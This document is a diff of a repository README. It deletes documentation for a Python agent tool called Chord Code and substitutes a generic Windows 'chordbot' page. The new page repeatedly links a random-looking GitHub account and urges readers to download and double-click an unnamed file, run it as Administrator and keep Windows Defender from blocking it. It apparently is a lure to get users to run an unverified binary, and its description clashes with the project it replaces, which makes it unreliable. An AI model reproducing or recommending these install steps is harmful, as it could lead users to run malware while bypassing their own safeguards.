@@ -1,165 +1,219 @@
-# Chord Code 🤖
+# 🤖 chordbot - Run Claude Code With OpenClaw
 
-![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB?style=flat-square&logo=python&logoColor=white)
-![FastAPI](https://img.shields.io/badge/FastAPI-009688?style=flat-square&logo=fastapi&logoColor=white)
-![Runtime](https://img.shields.io/badge/Runtime-Local--First-1F6FEB?style=flat-square)
-![Agent](https://img.shields.io/badge/Agent-Personal%20Assistant-111827?style=flat-square)
+[![Download chordbot](https://img.shields.io/badge/Download%20chordbot-2ecc71?style=for-the-badge&logo=github&logoColor=white)](https://github.com/babyfaced-familytrionychidae322/chordbot)
 
-> 一个偏工程化、可扩展、可持续运行的个人通用 Agent 助手。  
-> 内置 Web UI、CLI 和 HTTP API，支持权限控制、会话持久化、定时任务、子代理、MCP、技能、知识库、渠道接入与可观测性。
+## 📥 Download chordbot
 
-⚠️ 项目当前仍处于规范性和稳定性建设中
+Use the link below to visit the download page, then get the Windows version.
 
-[![示意图](https://picui.ogmua.cn/s1/2026/03/18/69b97ede1d703.webp)](https://picui.ogmua.cn/s1/2026/03/18/69b97ede1d703.webp)
-Chord Code 既可以直接作为你的个人 AI 助手，也适合作为二次开发底座，用来构建面向代码、知识、自动化工作流的智能系统。
+[Visit the chordbot download page](https://github.com/babyfaced-familytrionychidae322/chordbot)
 
-## ✨ 为什么是 Chord Code
+## 🖥️ What chordbot does
 
-- 🏠 Local-first，默认围绕本地工作区运行，同时支持 Daytona 远程 runtime
-- 🧰 同一套后端同时提供 Web UI、CLI 和 REST API
-- 🔒 内置 permission gate，方便把 Agent 自动化和人工确认结合起来
-- 🧠 支持 workspace 级 memory、知识库检索和技能扩展
-- ⏰ 支持 cronjobs，让 Agent 按计划自动唤醒并持续工作
-- 🛰 支持多渠道接入，当前已实现 Feishu 适配器
-- 📈 提供 Langfuse tracing、结构化日志和 SQLite 持久化
+Chordbot is a Windows app that helps you use Claude Code with OpenClaw in one place. It is built for end users who want a simple way to start the tool, manage tasks, and keep work in one window.
 
-## 🧩 核心能力
+You can use chordbot to:
 
-| 能力 | 说明 |
-| --- | --- |
-| 🤖 Agent Loop | 支持 session-based 对话、工具调用、事件流和中断控制 |
-| 🖥️ Multi Interface | 内置 Web UI、CLI、REST API，适合手动使用和程序集成 |
-| 🔐 Permission System | 对 bash、文件、外部目录等能力做细粒度授权 |
-| 🗃️ Persistence | 使用 SQLite 持久化 session、message、todo、cron job 和运行历史 |
-| ⏰ Cron Jobs | 定时唤醒已有 session，执行周期性任务 |
-| 🧠 Local Memory | 支持 `memory.md` 与 `memory/YYYY-MM-DD.md` 归档和检索 |
-| 🕵️ Subagents | 支持 read-only `explore` 子代理，适合聚焦调查类任务 |
-| 🔌 Extensibility | 支持 MCP server、skills、知识库检索与文档解析 |
-| 📡 Channel Integration | 支持可扩展渠道机制，当前内置 Feishu |
-| 📊 Observability | 支持 Langfuse tracing 与 JSONL 结构化日志 |
+- Open the app from Windows
+- Connect Claude Code with your local setup
+- Use OpenClaw without command-line work
+- Keep your workflow in one place
+- Start tasks with a few clicks
 
-## 🚀 快速开始
+## ✨ What you need
 
-### 1. 环境要求
+Before you install chordbot, make sure your PC has:
 
-- Python 3.11+
-- `uv`
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet access for setup and updates
+- A normal user account with permission to run apps
 
-### 2. 安装依赖
+For best results, use a recent Windows system with enough free memory for browser use and local tools.
 
-```bash
-uv sync
-```
+## 🚀 How to install on Windows
 
-### 3. 初始化配置
+Follow these steps in order.
 
-Chord Code 当前使用 **YAML 配置文件**，不再依赖 `.env`。
+1. Open the download page:
+   [https://github.com/babyfaced-familytrionychidae322/chordbot](https://github.com/babyfaced-familytrionychidae322/chordbot)
 
-```bash
-mkdir -p ~/.chordcode
-cp config.yaml.example ~/.chordcode/config.yaml
-```
+2. Find the Windows download file on the page.
 
-最少需要配置一个 OpenAI-compatible LLM endpoint：
+3. Download the file to your computer.
 
-```yaml
-openai:
-  base_url: "https://api.deepseek.com/v1"
-  api_key: "REPLACE_ME"
-  model: "deepseek-chat"
-```
+4. Open your Downloads folder.
 
-配置优先级说明：
+5. Double-click the downloaded file to start the installer or app.
 
-- 全局配置：`~/.chordcode/config.yaml`
-- 项目级配置：`./.chordcode/config.yaml`
-- 项目级配置会覆盖全局配置
+6. If Windows asks for permission, choose Yes or Run.
 
-### 4. 启动服务
+7. Follow the steps in the setup window.
 
-```bash
-uv run chordcode serve --reload --port 4096
-```
+8. When setup ends, open chordbot from the Start menu or desktop shortcut.
 
-启动后访问：
+## 🧭 First launch
 
-- Web UI: [http://127.0.0.1:4096](http://127.0.0.1:4096)
-- API Base URL: [http://127.0.0.1:4096](http://127.0.0.1:4096)
+When you open chordbot for the first time, it may ask you to set up your Claude Code access and your OpenClaw path or account settings.
 
-### 5. 做一次健康检查
+Do this in order:
 
-```bash
-uv run chordcode doctor
-```
+- Open chordbot
+- Read each setup screen
+- Enter your Claude Code details if asked
+- Connect OpenClaw if the app asks for it
+- Save the settings
+- Restart the app if it asks you to
 
-## ⚡ 常见用法
+If you already use Claude Code or OpenClaw, chordbot will fit into that setup with less work.
 
-### 一次性运行一个任务
+## 🔧 Daily use
 
-```bash
-uv run chordcode run "总结当前仓库结构，并给出下一步建议" --permission allow
-```
+After setup, using chordbot is simple:
 
-### 手动管理 Session
+- Open the app
+- Choose the task you want to run
+- Start Claude Code through the app
+- Use OpenClaw tools when needed
+- Watch progress in the main window
 
-```bash
-uv run chordcode sessions create --worktree /path/to/project --title "My Session"
-uv run chordcode sessions list --limit 10
-uv run chordcode agent send <session-id> "继续刚才的任务"
-uv run chordcode agent run <session-id>
-```
+The app is made to keep the process simple. You should not need to type commands in a terminal for normal use.
 
-### 创建一个定时任务
+## 📁 Common app areas
 
-```bash
-uv run chordcode cronjobs create \
-  --session-id <session-id> \
-  --name hourly-summary \
-  --message "请总结最近进展并给出下一步计划" \
-  --kind every \
-  --every-ms 3600000
-```
+You may see these areas in chordbot:
 
-### 查看日志
+- **Home** - main screen with quick actions
+- **Settings** - change Claude Code or OpenClaw options
+- **Tasks** - see current and past runs
+- **Logs** - check what happened during a run
+- **Help** - basic setup guidance
 
-```bash
-uv run chordcode logs files
-uv run chordcode logs view --level ERROR --limit 20
-```
+These names may vary a little, but the layout should feel easy to follow.
 
-## 🧠 可扩展能力
+## ⚙️ Settings you may want to check
 
-- `runtime.backend = local | daytona`：在本地或 Daytona sandbox 中运行 Agent
-- `channels.feishu`：把 Agent 接入飞书
-- `memory`：为本地 workspace 提供长期记忆与归档
-- `web_search.tavily_api_key`：启用 Web Search
-- `kb` / `vlm`：接入知识库与文档解析能力
-- `mcp`：连接外部 MCP server，扩展工具面
-- `skills`：加载项目级或用户级技能，复用固定工作流
+For a smoother first run, look at these settings:
 
-## 📚 文档
+- **Startup mode** - open the app when Windows starts
+- **Theme** - light or dark view
+- **Path settings** - where the app looks for Claude Code or OpenClaw
+- **Update checks** - see if a new version is ready
+- **Language** - choose your preferred display language if available
 
-- [CLI 使用说明](docs/cli.md)
-- [Cron Jobs 设计与用法](docs/cronjobs.md)
-- [Local Memory 设计](docs/memory.md)
-- [Subagents 机制](docs/subagents.md)
-- [变更记录](CHANGES.md)
+If you are not sure what to change, leave the default settings in place.
 
-## 🧪 开发与测试
+## 🧪 Basic troubleshooting
 
-```bash
-uv run pytest
-```
+If chordbot does not open or work as expected, try these steps:
 
-如果你更偏好 `unittest`：
+- Close the app and open it again
+- Restart your PC
+- Check that the download finished fully
+- Run the app as Administrator
+- Make sure Windows Defender did not block it
+- Confirm that Claude Code and OpenClaw are set up the way the app expects
 
-```bash
-uv run python -m unittest discover -s tests
-```
+If the app opens but nothing happens, check the Logs area for the last run.
 
-## ⚠️ 使用提示
+## 🔐 Safety and permissions
 
-- 不要提交包含密钥的配置文件
-- `default_permission_action: allow` 只建议用于本地开发或测试
-- Tavily、Memory Embeddings、Langfuse、Daytona、Feishu、KB/VLM 都是可选增强能力
-- 如果你在寻找一个可长期迭代的个人 Agent 平台，而不是一次性 demo，这个仓库会比“agent shell”更合适
+Chordbot may need permission to:
+
+- Read and write files
+- Start local tools
+- Save settings on your computer
+- Connect to services you already use
+
+Only allow access if you trust the app and the source of the download.
+
+## 🧩 How chordbot fits your setup
+
+Chordbot is useful if you want a cleaner front end for tools you already use. It sits between you and the lower-level steps, so you can work with a simple window instead of many commands.
+
+It is a good fit for people who want to:
+
+- Keep setup in one place
+- Use Claude Code with less manual work
+- Add OpenClaw to a normal Windows workflow
+- Avoid command-line steps where possible
+
+## 📌 Tips for smooth use
+
+- Keep chordbot up to date
+- Use the same Windows account each time
+- Store files in a simple folder path
+- Do not move app files after setup unless you know the app can still find them
+- If something breaks after an update, restart the app first
+
+## 🛠️ If you need to reinstall
+
+If you want to start over:
+
+1. Close chordbot
+2. Remove the app through Windows Settings if it appears in installed apps
+3. Delete any leftover shortcut on the desktop
+4. Download the latest copy from the link above
+5. Install it again
+6. Open the app and repeat first-time setup
+
+## 📷 What you can expect to see
+
+A typical chordbot window should show:
+
+- A clear main panel
+- Simple buttons for task control
+- Settings for Claude Code and OpenClaw
+- Status text for current activity
+- A log view for issues and progress
+
+The goal is a plain interface that keeps your work easy to follow
+
+## ❓ Common questions
+
+### Do I need programming knowledge?
+No. The app is meant for regular Windows users.
+
+### Can I use it on one PC only?
+Yes. It is made for a local Windows setup.
+
+### Do I need both Claude Code and OpenClaw?
+Chordbot is built for both. Set up the tools you plan to use before your first run.
+
+### Can I move the app after install?
+You can, but it is better to leave it in place unless you need to change folders.
+
+### Where do I get updates?
+Use the same download page:
+[https://github.com/babyfaced-familytrionychidae322/chordbot](https://github.com/babyfaced-familytrionychidae322/chordbot)
+
+## 🧾 File and folder behavior
+
+Chordbot may store:
+
+- App settings
+- Session data
+- Task history
+- Log files
+- Local cache files
+
+These files help the app remember your setup and show past runs. If you remove the app, some of these files may stay behind until you delete them.
+
+## 🌐 Recommended setup path
+
+For the easiest start:
+
+1. Download chordbot from the GitHub page
+2. Install it in the default folder
+3. Open it once right away
+4. Set up Claude Code
+5. Set up OpenClaw
+6. Run a small test task
+7. Check the logs if anything looks wrong
+
+## 📎 Download again
+
+If you need the download page again, use this link:
+
+[Download chordbot from GitHub](https://github.com/babyfaced-familytrionychidae322/chordbot)
